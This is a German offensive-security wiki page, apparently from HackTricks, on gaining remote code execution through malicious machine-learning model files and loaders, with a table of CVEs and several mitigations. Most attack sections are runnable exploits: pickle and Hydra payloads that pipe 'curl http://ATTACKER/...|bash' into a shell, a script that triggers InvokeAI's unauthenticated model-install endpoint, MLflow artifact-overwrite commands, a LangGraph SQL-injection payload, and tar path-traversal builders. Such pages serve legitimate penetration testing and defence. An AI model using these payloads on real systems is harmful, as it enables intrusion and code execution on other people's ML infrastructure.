# Modelle-RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laden, um RCE auszulösen

Machine-Learning-Modelle werden üblicherweise in verschiedenen Formaten wie ONNX, TensorFlow, PyTorch usw. weitergegeben. Entwickler oder Produktionssysteme können diese Modelle laden und verwenden. Normalerweise sollten die Modelle keinen schädlichen Code enthalten, aber in manchen Fällen kann ein Modell dazu verwendet werden, beliebigen Code auf dem System auszuführen – entweder als beabsichtigte Funktion oder aufgrund einer Schwachstelle in der Bibliothek zum Laden von Modellen.

Die folgende Tabelle enthält repräsentative Schwachstellen dieser Kategorie:

| **Framework / Tool**        | **Schwachstelle (falls verfügbar: CVE)**                                                    | **RCE-Vektor**                                                                                                                           | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Schädliches Pickle im Modell-Checkpoint führt zur Codeausführung (umgeht die Schutzmaßnahme `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + Download eines schädlichen Modells führt zur Codeausführung; Java-Deserialisierungs-RCE in der Management-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Checkpoint-Deserialisierung über `torch.load` **(CVE-2025-23298)**                                           | Nicht vertrauenswürdiger Checkpoint löst beim Aufruf von `load_model_trainer_states_from_checkpoint` einen Pickle-Reducer aus → Codeausführung im ML-Worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis-Checkpointer) | SQLi + unsicherer MessagePack-Erweiterungshook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ein benutzerkontrollierter `filter`-Schlüssel injiziert SQL-/JSON-Pfad-Syntax, `UNION SELECT` erstellt eine gefälschte Checkpoint-Zeile, anschließend importiert und ruft die `msgpack`-Deserialisierung vom Angreifer gewählten Python-Code auf | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras-Lambda)                                                      | Beim Laden eines Modells aus YAML wird `yaml.unsafe_load` verwendet (Codeausführung) <br> Beim Laden eines Modells mit einer **Lambda**-Schicht wird beliebiger Python-Code ausgeführt          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Ein präpariertes `.tflite`-Modell löst einen Integer-Overflow → Heap-Beschädigung aus (potenzielle RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Das Laden eines Modells über `joblib.load` führt das Pickle mit der `__reduce__`-Payload des Angreifers aus                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                              | Der Standardwert von `numpy.load` erlaubte Pickle-Objektarrays – ein schädliches `.npy/.npz` löst Codeausführung aus                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Verzeichnistraversal) <br> **CVE-2024-5187** (Tar-Traversal)                                                    | Der Pfad zu externen Gewichten eines ONNX-Modells kann aus dem Verzeichnis herausführen (beliebige Dateien lesen) <br> Ein schädliches ONNX-Modellarchiv kann beliebige Dateien überschreiben (führt zu RCE) | |
| ONNX Runtime (Designrisiko)  | *(Keine CVE)* Benutzerdefinierte ONNX-Operatoren / Kontrollfluss                                                                                    | Ein Modell mit einem benutzerdefinierten Operator erfordert das Laden von nativem Code des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuführen   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Pfadtraversal)                                                                                          | Die Verwendung der Model-Load-API mit aktiviertem `--model-control` ermöglicht einen relativen Pfadtraversal, um Dateien zu schreiben (z. B. `.bashrc` für RCE zu überschreiben)    | |
| **GGML (GGUF-Format)**      | **CVE-2024-25664 … 25668** (mehrere Heap-Overflows)                                                                         | Eine fehlerhafte GGUF-Modell-Datei verursacht Heap-Buffer-Overflows im Parser und ermöglicht so die Ausführung beliebigen Codes auf dem System des Opfers                     | |
| **Keras (ältere Formate)**   | *(Keine neue CVE)* Veraltetes Keras-H5-Modell                                                                                         | Schädliche HDF5-Modelle (`.h5`) mit einer Lambda-Schicht führen beim Laden weiterhin Code aus (Keras `safe_mode` deckt das alte Format nicht ab – „Downgrade-Angriff“) | |
| **Andere** (allgemein)        | *Designfehler* – Pickle-Serialisierung                                                                                         | Viele ML-Tools (z. B. Pickle-basierte Modellformate, Python `pickle.load`) führen beliebigen Code aus, der in Modelldateien eingebettet ist, sofern keine Gegenmaßnahmen getroffen werden | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nicht vertrauenswürdige Metadaten werden an `hydra.utils.instantiate()` übergeben **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Vom Angreifer kontrollierte Modellmetadaten/Konfiguration setzen `_target_` auf einen beliebigen Callable (z. B. `builtins.exec`) → wird beim Laden ausgeführt, selbst bei „sicheren“ Formaten (`.safetensors`, `.nemo`, `config.json` des Repos) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Darüber hinaus gibt es einige Python-Pickle-basierte Modelle, etwa solche, die von [PyTorch](https://github.com/pytorch/pytorch/security) verwendet werden und mit denen beliebiger Code auf dem System ausgeführt werden kann, wenn sie nicht mit `weights_only=True` geladen werden. Daher können alle Pickle-basierten Modelle besonders anfällig für diese Art von Angriffen sein, auch wenn sie in der obigen Tabelle nicht aufgeführt sind.

### Hydra-Metadaten → RCE (funktioniert auch mit safetensors)

`hydra.utils.instantiate()` importiert und ruft jedes punktierte `_target_` in einem Konfigurations-/Metadatenobjekt auf. Wenn Bibliotheken wie Hugging Face Transformers **nicht vertrauenswürdige Modellmetadaten** an `instantiate()` übergeben, kann ein Angreifer einen Callable und Argumente angeben, die sofort beim Laden des Modells ausgeführt werden (kein Pickle erforderlich).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Beispiel-Payload (funktioniert in `model_config.yaml` eines `.nemo`, `config.json` eines Repos oder `__metadata__` innerhalb von `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Kernaussagen:
- Wird vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, den HuggingFace-Codern von uni2TS und den FlexTok-Loadern ausgelöst.
- Hydras String-Sperrliste lässt sich über alternative Importpfade (z. B. `enum.bltns.eval`) oder von der Anwendung aufgelöste Namen (z. B. `nemo.core.classes.common.os.system` → `posix`) umgehen.<sup>[[14]](#references)</sup>
- FlexTok parst außerdem stringifizierte Metadaten mit `ast.literal_eval`, wodurch vor dem Hydra-Aufruf ein DoS (CPU-/Speicherüberlastung) möglich ist.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable Diffusion. Die Versionen **5.3.1 – 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, über den Nutzer Modelle von beliebigen URLs herunterladen und laden können.<sup>[[1]](#references)</sup>

Intern ruft der Endpunkt schließlich Folgendes auf:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wenn es sich bei der bereitgestellten Datei um einen **PyTorch-Checkpoint (`*.ckpt`)** handelt, führt `torch.load` eine **Pickle-Deserialisierung** durch. Da der Inhalt direkt von der vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in den Checkpoint einbetten. Diese Methode wird **während der Deserialisierung** ausgeführt und ermöglicht **Remote Code Execution (RCE)** auf dem InvokeAI-Server.

Die Schwachstelle erhielt die Kennung **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploit-Ablauf

1. Einen bösartigen Checkpoint erstellen:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Stelle `payload.ckpt` auf einem von dir kontrollierten HTTP-Server bereit (z. B. `http://ATTACKER/payload.ckpt`).
3. Löse den verwundbaren Endpunkt aus (keine Authentifizierung erforderlich):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Fertiger Exploit: Das **Metasploit**-Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.<sup>[[3]](#references)</sup>

#### Bedingungen

•  InvokeAI 5.3.1-5.4.2 (Scan-Flag standardmäßig **false**)
•  `/api/v2/models/install` ist für den Angreifer erreichbar
•  Der Prozess hat Berechtigungen zum Ausführen von Shell-Befehlen

#### Gegenmaßnahmen

* Upgrade auf **InvokeAI ≥ 5.4.3** – der Patch setzt `scan=True` standardmäßig und führt vor der Deserialisierung einen Malware-Scan durch.<sup>[[2]](#references)</sup>
* Verwende beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-Helper.
* Erzwinge Allow-Lists / Signaturen für Modellquellen und führe den Dienst mit den geringstmöglichen Berechtigungen aus.

> ⚠️ Denk daran: **Jedes** Python-Pickle-basierte Format (einschließlich vieler `.pt`-, `.pkl`-, `.ckpt`- und `.pth`-Dateien) ist grundsätzlich unsicher, wenn es aus nicht vertrauenswürdigen Quellen deserialisiert wird.

---

Beispiel für eine Ad-hoc-Gegenmaßnahme, falls ältere InvokeAI-Versionen hinter einem Reverse-Proxy weiterlaufen müssen:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE über unsicheres `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (Teil von Merlin) enthielt einen unsicheren Checkpoint-Loader, der `torch.load()` direkt mit vom Benutzer bereitgestellten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein vom Angreifer kontrollierter Checkpoint während der Deserialisierung über einen Reducer beliebigen Code ausführen.<sup>[[5]](#references)</sup>

Verwundbarer Pfad (vor dem Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum dies zu RCE führt: In Python pickle kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der eine aufrufbare Funktion und Argumente zurückgibt. Die Funktion wird während des Unpicklings ausgeführt. Ist ein solches Objekt in einem Checkpoint enthalten, wird sein Code ausgeführt, bevor irgendwelche Gewichte verwendet werden.

Minimales Beispiel für einen bösartigen Checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Delivery-Vektoren und Auswirkungsbereich:
- Trojanisierte Checkpoints/Modelle, die über Repos, Buckets oder Artifact-Registries geteilt werden
- Automatisierte Resume-/Deploy-Pipelines, die Checkpoints automatisch laden
- Die Ausführung findet in Trainings-/Inference-Workern statt, oft mit erhöhten Berechtigungen (z. B. als root in Containern)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte den direkten Aufruf von `torch.load()` durch einen eingeschränkten Deserialisierer mit Allowlist, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass während des Ladens beliebige Callables aufgerufen werden.<sup>[[7]](#references)</sup>

Spezielle Empfehlungen zum Schutz von PyTorch-Checkpoints:
- Unpickle keine nicht vertrauenswürdigen Daten. Bevorzuge nach Möglichkeit nicht ausführbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX.
- Wenn du die PyTorch-Serialisierung verwenden musst, stelle sicher, dass `weights_only=True` gesetzt ist (wird von neueren PyTorch-Versionen unterstützt), oder verwende einen benutzerdefinierten Unpickler mit Allowlist, ähnlich dem Transformers4Rec-Patch.<sup>[[4]](#references)</sup>
- Erzwinge die Überprüfung der Modellherkunft/Signaturen und führe die Deserialisierung in einer Sandbox aus (seccomp/AppArmor; kein root-Benutzer; eingeschränktes Dateisystem und kein ausgehender Netzwerkverkehr).
- Überwache ML-Services beim Laden von Checkpoints auf unerwartete Kindprozesse; verfolge die Verwendung von `torch.load()`/`pickle`.

POC- sowie Referenzen zu verwundbaren und gepatchten Versionen:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Verwundbarer Loader vor dem Patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC für einen schädlichen Checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader nach dem Patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Beispiel – Erstellen eines schädlichen PyTorch-Modells

- Erstelle das Modell:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Modell laden:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD stellt einen `resnet`-Endpoint bereit, der benutzergesteuerte Daten deserialisiert. ZDI bestätigte, dass ein Remote-Angreifer ein Opfer dazu bringen kann, eine schädliche Seite/Datei zu laden, diese einen präparierten serialisierten Blob an den Endpoint senden zu lassen und so eine Deserialisierung als `root` auszulösen, was zur vollständigen Kompromittierung führt.

Der Exploit-Ablauf entspricht typischem pickle-Missbrauch:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Jedes Gadget, das während der Deserialisierung erreichbar ist (Konstruktoren, `__setstate__`, Framework-Callbacks usw.), kann auf dieselbe Weise als Waffe eingesetzt werden – unabhängig davon, ob die Übertragung über HTTP, WebSocket oder eine Datei erfolgte, die in einem überwachten Verzeichnis abgelegt wurde.



### LangGraph checkpointer SQLi → MessagePack RCE

Diese Angriffskette ist interessant, weil der Angreifer **keine schädliche Modelldatei hochladen muss**. Stattdessen stellt die Anwendung eine **AI-Agent-Persistenz-API** (`get_state_history(..., filter=...)`) bereit, und Benutzereingaben gelangen zum Abfrage-Builder des checkpointers.

#### 1. Strukturelle SQLi in Metadatenfiltern

Ein anfälliges SQLite-Muster sah so aus:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Der Wert wird später gebunden, aber `query_key` wird in den **JSON-Pfad-String** verkettet. Ein `'` im Dictionary-Key beendet daher `'$.{query_key}'` und schleust SQL ein. Dieselbe Lektion gilt für **JSON-Pfade, Bezeichner, Operatoren, `LIMIT` und TTL-Felder**: Platzhalter schützen nur Werte, nicht die strukturelle Abfragesyntax.

#### 2. `UNION SELECT` kann nachgelagerte Senken ansteuern, nicht nur Daten stehlen

Die Abfrage gibt `type` und serialisierte `checkpoint`-Bytes zurück, die später wie folgt verarbeitet werden:

```python
self.serde.loads_typed((type, checkpoint))
```

Das bedeutet, dass eine SQLi in der `WHERE`-Klausel eine **gefälschte Ergebniszeile** einschleusen kann:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Wenn späterer Code eine ausgewählte Spalte parst, deserialisiert, schreibt oder ausführt, ordne diese Spalten ihren Sinks zu. In diesem Fall macht die gefälschte Zeile aus SQLi eine **angreifergesteuerte Deserialisierung**.

#### 3. Unsichere MessagePack-Extension-Hooks sind gleichbedeutend mit Code-Gadgets

Der `msgpack`-Pfad von LangGraph verwendete einen benutzerdefinierten Extension-Hook, der ein verschachteltes Tupel entpackte und Folgendes ausführte:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Ein MessagePack-Extension-Objekt, das etwas Äquivalentes zu `("os", "system", "id > /tmp/pwned")` codiert, importiert also `os`, löst `system` auf und führt den Befehl aus. Prüfen Sie bei der Analyse von AI-Frameworks **benutzerdefinierte MessagePack/JSON/pickle-Reviver** auf dynamische Imports, Reflection oder beliebige Callable-Aufrufe.

#### 4. Praktisches Audit-Muster für Agent-Frameworks

Prüfen Sie jede benutzergesteuerte Eingabe, die Folgendes erreicht:
- APIs zum Auflisten von Zustandsverläufen / Memory / Replay / Checkpoints
- Builder für strukturierte Filter, die SQL- oder Redis-Abfragefragmente erzeugen
- benutzerdefinierte Deserialisierer (`pickle`, `msgpack`, `json`-Object-Hooks, YAML-Konstruktoren)
- Wiederherstellungspfade, die den von der Persistenzebene zurückgegebenen Zeilen vertrauen

Diese spezifische Angriffskette betraf selbst gehostete LangGraph-Deployments mit **SQLite**- oder **Redis**-Checkpointern, wenn nicht vertrauenswürdige Benutzer `filter` kontrollieren konnten. In der Offenlegung genannte gepatchte Versionen waren `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` und `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow-PyFunc-Artefaktüberschreibung zu pickle-RCE

Ein MLflow PyFunc, der aus einem `PythonModel` erstellt wurde, kann das serialisierte Objekt als `python_model.pkl` speichern. Die Modellmetadaten geben `mlflow.pyfunc.model` als Loader an, und die MLflow-Implementierung verwendet diesen Dateinamen für das gespeicherte Python-Modell. Daher kann Schreibzugriff auf den Artefaktspeicher zu Codeausführung in einer anderen Anwendung führen, die das Modell später lädt.<sup>[[17]](#references)[[18]](#references)</sup>

Die relevante Angriffskette lautet **Schreibberechtigung für Artefakte → pickle ersetzen → einen Inference-Consumer dazu bringen, es erneut zu laden**. Bei einem Experiment, das einen proxied `mlflow-artifacts:/...`-Root verwendet, sollten Sie den Artefaktpfad des Experiments, des Runs und des Modells ermitteln. Der Tracking-Server stellt `GET` und `PUT` unter `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` bereit.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Ein Minimal-Reducer kann einen Befehl ausführen, sobald der Konsument das Artefakt unpicklet. Wenn die Payload mit der in `MLmodel` angegebenen Python-Version erzeugt wird, lassen sich Kompatibilitätsprobleme vermeiden.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Lösen Sie den Vorgang aus, der das **vorhandene Modell lädt**, etwa eine Vorhersage, ein Scoring oder ein Deployment. Führen Sie vorher kein Training durch, da das Training das bösartige Artefakt durch ein neues Modell ersetzen könnte. Ein Anwendungsfehler widerlegt die Ausnutzung nicht: Der Reducer gibt den ganzzahligen Exit-Status des Befehls statt eines verwendbaren Modells zurück. Beginnen Sie mit einem beobachtbaren Nebeneffekt wie ICMP oder einem HTTP-Callback und ersetzen Sie diesen dann durch die endgültige Payload.<sup>[[20]](#references)</sup>

Unterscheiden Sie während der Prüfung zwischen der Berechtigung, einen Run zu erstellen, und der Berechtigung, Artefakte eines anderen Runs zu überschreiben. Prüfen Sie die Authentifizierung und die Update-Berechtigungen pro Run, untersuchen Sie unerwartete Änderungen an `python_model.pkl` und betrachten Sie die Herkunft und Integrität des Modells als Teil der Ausführungsgrenze. Der aktuelle MLflow-Code unterstützt außerdem die Einstellung `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` und empfiehlt Models-from-Code-Artefakte, statt cloudpickle-Daten zu laden.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Exponierte Model-Server und ML-Infrastruktur

Das Laden eines bösartigen Modells ist nicht die einzige Möglichkeit, Code auf ML-Infrastruktur auszuführen. APIs zur Job-Übermittlung, Code-Validierungsendpunkte und Model-Registry-Pulls von selbst gehosteten AI-Diensten können Codeausführung ermöglichen, ohne dass eine Modelldatei benötigt wird. Siehe [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Modelle zu Path Traversal

Wie in [**diesem Blogbeitrag**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) erläutert, basieren die meisten von verschiedenen AI-Frameworks verwendeten Modellformate auf Archiven, üblicherweise `.zip`-Dateien. Daher ist es möglicherweise möglich, diese Formate für Path-Traversal-Angriffe zu missbrauchen, um beliebige Dateien auf dem System zu lesen, auf dem das Modell geladen wird.<sup>[[16]](#references)</sup>

Mit dem folgenden Code können Sie beispielsweise ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` anlegt:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Oder mit dem folgenden Code kannst du ein Modell erstellen, das beim Laden einen Symlink zum Verzeichnis `/tmp` erstellt:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Tiefenanalyse: Keras-.keras-Deserialisierung und Gadget-Suche

Eine gezielte Anleitung zu .keras-Interna, RCE über Lambda-Layer, dem Problem des beliebigen Imports in ≤ 3.8 und der Suche nach Gadgets innerhalb der Allowlist nach dem Fix findest du hier:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec-Blog – „CVE-2024-12029 – InvokeAI-Deserialisierung nicht vertrauenswürdiger Daten“](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-Patch-Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentation des Rapid7-Metasploit-Moduls](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – Sicherheitsaspekte von torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI-Blog – CVE-2025-23298: Erlangung von Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-Sicherheitshinweis: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-Patch-Commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Verwundbarer Loader vor dem Patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC für einen bösartigen Checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nach dem Patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution mit modernen KI/ML-Formaten und -Bibliotheken](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra-Dokumentation zu instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-Commit zur Blockliste (Warnung vor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Von SQLi zu RCE: Ausnutzung von LangGraphs Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive-Slip-Bugs für wertvolle KI/ML-Bounties nutzen](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk-Sicherheitshinweis und PyFunc-Proof-of-Concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow-Quellcode – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow-REST-API – Endpunkte zum Herunterladen und Hochladen von Artefakten](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
